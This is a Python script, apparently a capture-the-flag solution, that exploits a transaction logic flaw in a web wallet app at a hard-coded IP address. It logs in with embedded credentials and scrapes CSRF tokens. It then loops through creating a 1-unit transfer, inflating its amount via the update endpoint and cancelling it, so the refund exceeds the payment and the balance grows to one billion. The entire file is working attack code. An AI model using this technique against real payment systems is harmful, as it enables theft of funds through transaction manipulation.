import requests as req
from bs4 import *
import json
'''
    Sorry if its really messy and buggy >_<
'''
r = req.Session()
balance, id = 0, ""
def login():    
    b = BeautifulSoup(r.get('http://103.152.242.56:6901/login/').text, 'html.parser')
    token = b.find('input', {'name':'csrfmiddlewaretoken'})['value']    
    print("[+] Logged in as YaeMiko_emang_cantik:nyx")
    (r.post('http://103.152.242.56:6901/login/', data={'username':'YaeMiko_emang_cantik', 'password':'nyx', 'csrfmiddlewaretoken':token}))

def getBalance():
    b = BeautifulSoup(r.get('http://103.152.242.56:6901/dashboard/').text, 'html.parser')
    global balance
    balance = (int(b.find('text', {'style':'font-size:85px;fill:#ffffff;font-weight:300;line-height:1.25;font-family:Nunito,sans-serif;'}).text.replace(" ", "").replace("\n", "").replace(",", "")[1:]))
    print("[+] Balance " + str(balance))
    
def creatTrx():
    b = BeautifulSoup(r.get('http://103.152.242.56:6901/dashboard/').text, 'html.parser')
    token = b.find('input', {'name':'csrfmiddlewaretoken'})['value']
    print("[+] Create Transaction")
    (r.post("http://103.152.242.56:6901/transaction/send/", data={"csrfmiddlewaretoken":token, "recipient":"minions279", "msg":"a", "amount":1, "transaction_password":"nyx"}))

def updateTrx(bal):
    s_bal = bal - 1
    b = BeautifulSoup(r.get('http://103.152.242.56:6901/dashboard/').text, 'html.parser')
    token = b.find('input', {'name':'csrfmiddlewaretoken'})['value']
    print("[+] Update Transaction")
    global id
    id = (json.loads(r.get("http://103.152.242.56:6901/api/v1/history/sent/").text)["data"][0]["id"])       
    (r.post(f"http://103.152.242.56:6901/transaction/{id}/update/", data={"csrfmiddlewaretoken":token, "transaction_password":"nyx", "msg":"a", "amount":s_bal}))

def cancelTrx(id):
    print("[+] Cancel Transcation")
    r.get(f'http://103.152.242.56:6901/transaction/{id}/delete/')

if __name__ == '__main__':
    login()
    while balance < 1000000000:    
        getBalance()
        print(balance)
        creatTrx()
        updateTrx(balance)
        cancelTrx(id)
